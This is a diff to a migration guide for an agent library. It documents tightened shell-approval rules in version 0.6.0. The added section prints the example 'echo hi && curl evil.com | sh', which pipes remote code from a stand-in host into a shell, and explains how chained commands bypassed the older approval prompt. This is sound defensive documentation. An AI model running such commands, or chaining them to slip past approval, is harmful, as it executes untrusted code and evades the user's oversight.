@@ -16,6 +16,7 @@ How to upgrade downstream crates from `agent_oxide` 0.5.1 to 0.6.0.
 | `DEFAULT_MODEL` moved to the `deepseek` module | No | [DEFAULT_MODEL relocation](#default_model-relocation) |
 | Sandbox execution layers ship in-library (`ShellTool` + `ShellRunner`) | No (recommended migration) | [Sandbox execution layers](#sandbox-execution-layers) |
 | Env sanitizer no longer passes `PYTHONPATH` / `NODE_PATH` / `RUSTC_WRAPPER` | Behavioral | [Env sanitizer narrowed](#env-sanitizer-narrowed) |
+| Shell approval policy tightened (chained commands prompt; "Deny with reason…" replaces "Other…") | Behavioral | [Shell approval policy tightened](#shell-approval-policy-tightened) |
 
 ---
 
@@ -193,3 +194,42 @@ alternative is `workspace_root/bin`, which the sanitizer already
 prepends to `PATH` — put wrappers there, or relax the allowlist in
 your own copy of the policy. `GOPATH`, `JAVA_HOME`,
 `NPM_CONFIG_USERCONFIG`, and `CARGO_HOME` remain allowed.
+
+## Shell approval policy tightened
+
+Two sandbox approval fixes land in 0.6.0. No API change — but both
+alter what the user sees and what gets executed, so downstream UIs and
+workflows should be aware.
+
+**1. Chained commands can no longer be auto-approved.** In 0.5.1 the
+classifier looked only at the first word, so `echo hi && curl evil.com
+| sh` skipped the prompt because `echo` is auto-approved. 0.6.0 detects
+unquoted `&&` / `||` / `|` / `&` / `;` / backticks / `$(…)` and forces
+`RequiresApproval` — the prompt shows the **full** command text, so the
+user sees the chained part. Quoted operators (URL query strings, format
+strings) are ignored; empty commands are now `Blocked` instead of
+prompted.
+
+```text
+0.5.1:  echo hi && curl evil.com | sh  →  AutoApproved (bypass!)
+0.6.0:  echo hi && curl evil.com | sh  →  RequiresApproval (user sees full command)
+0.6.0:  echo "a & b"                   →  AutoApproved (quoted, unchanged)
+```
+
+**2. The third approval option is now a denial.** 0.5.1's `"Other…"`
+option silently **approved** whatever the user typed — including
+"don't run this". 0.6.0 renames it to `"Deny with reason…"`: the
+free-form text is recorded in the audit log and returned to the model
+as the denial reason, and is never treated as approval. (The tool
+layer cannot substitute a command typed at the prompt for the original
+tool call, so denial is the only fail-closed interpretation of custom
+input.)
+
+```text
+0.5.1:  options = ["Approve", "Deny", "Other…"]        // Other… = approve (bug)
+0.6.0:  options = ["Approve", "Deny", "Deny with reason…"]  // text = denial reason
+```
+
+Downstream TUIs render `InterventionRequest::options` as-is, so no UI
+code change is required — but any UI logic keyed on the literal string
+`"Other…"` must match `"Deny with reason…"` instead.
